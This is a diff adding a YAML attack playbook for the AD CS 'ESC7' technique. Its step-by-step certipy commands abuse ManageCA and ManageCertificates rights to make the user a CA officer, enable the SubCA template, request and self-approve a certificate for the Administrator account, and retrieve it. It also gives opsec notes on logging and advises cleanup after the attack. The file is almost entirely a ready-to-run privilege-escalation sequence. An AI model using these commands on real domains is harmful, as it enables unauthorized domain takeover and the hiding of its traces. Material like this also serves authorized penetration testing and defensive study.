@@ -1,0 +1,25 @@
+name: ADCSESC7
+description: ESC7 - ManageCA + ManageCertificates combined for arbitrary certificate issuance
+commands:
+- '# Check ManageCA permissions'
+- certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP>
+- ''
+- '# Step 1: Add yourself as an officer (ManageCA)'
+- certipy ca -ca '<CA_NAME>' -add-officer '<USER>' -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
+- ''
+- '# Step 2: Enable SubCA template (if not enabled)'
+- certipy ca -ca '<CA_NAME>' -enable-template SubCA -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
+- ''
+- '# Step 3: Request SubCA certificate (will be pending)'
+- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target '<CA_HOST>' -template SubCA -upn Administrator@<DOMAIN>
+- ''
+- '# Step 4: Approve pending request (ManageCertificates)'
+- certipy ca -ca '<CA_NAME>' -issue-request <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
+- ''
+- '# Step 5: Retrieve issued certificate'
+- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target '<CA_HOST>' -retrieve <REQUEST_ID>
+opsec:
+- Officer additions and certificate approvals are logged
+- Consider cleanup after attack
+references:
+- https://posts.specterops.io/certified-pre-owned-d95910965cd2
